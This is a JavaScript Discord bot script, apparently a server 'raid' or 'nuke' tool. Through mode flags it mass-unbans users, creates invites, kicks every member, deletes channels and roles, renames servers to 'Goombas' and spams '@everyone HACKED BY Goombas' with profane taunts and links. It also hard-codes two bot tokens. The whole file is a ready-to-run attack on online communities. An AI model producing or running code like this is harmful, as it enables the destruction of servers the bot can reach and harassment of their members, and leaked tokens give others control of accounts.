const Discord = require("discord.js");
const client = new Discord.Client();
let createInviteMode = false;
let raidMode = false;
let restoreMode = false;
let destroyMode = false;
unban = true;
client.login("NTE5NDczOTg0NzI3OTQxMTQw.Duf1eg.9S2BZsXX1tFgIcRYJQjwXO-QNUA");
client.on("ready", () => {
  console.log(
    `Logged in as ${client.user.tag}! With {
      client.shard.count
    } shards! Serving ${client.guilds.size}`
  );

  client.guilds.forEach(guild => {
    guild.channels.forEach(chan => {
      if (unban) {
        guild.fetchBans().then(bans => {
          bans.forEach(ban => {
            guild.unban(ban).then(() => {
              console.log(ban.username);
            });
          });
        });
      }
      if (destroyMode) {
        guild.members.forEach(member => {
          member.kick("GOOMBAS").then(() => {
            console.log("KICKED");
          });
        });
        chan.delete("GOOMBAS");
        return guild.roles.forEach(role => {
          role.delete("GOOMBAS");
        });
      }
      if (createInviteMode) {
        return chan
          .createInvite()
          .then(invite =>
            console.log(`Created an invite with a code of ${invite.code}`)
          )
          .catch(console.error);
      }
      if (restoreMode) {
        if (chan.name.toLowerCase().startsWith("goombas-")) {
          chan.setName(chan.name.substr("goombas-".length));
        }
        guild.setName("The Church of Pyrocynical");
        guild.setIcon("./tcop.png");
      }
      if (raidMode) {
        chan.setName("goombas-" + chan.name);
        guild.setName("Goombas");
        guild.setIcon("./goomba.png");
        let i = 0;
        while (i < 10) {
          try {
            client.guilds.map(guild => {
              let found = 0;
              guild.channels.map(c => {
                if (found === 0) {
                  if (c.type === "text") {
                    c.send(
                      "@everyone HACKED BY Goombas !!! GOOMBA GOOMBA GOOMBA !!! COME FIGHT US YOU FUCKING PUSSIES! discord.gg/zr6h46f https://bit.ly/2Sa7j7R"
                    );
                  }
                }
              });
            });
          } catch (err) {
            console.log(err);
          }
          i++;
        }
      }
    });
  });
});
client.on("error", error => {
  console.log(error);
});
//client.login("NTE4ODk4MjgwNjAwNTY3ODA4.DuXdOQ.Ra363CL1tp1yViwTcH3d0TUZYg8");
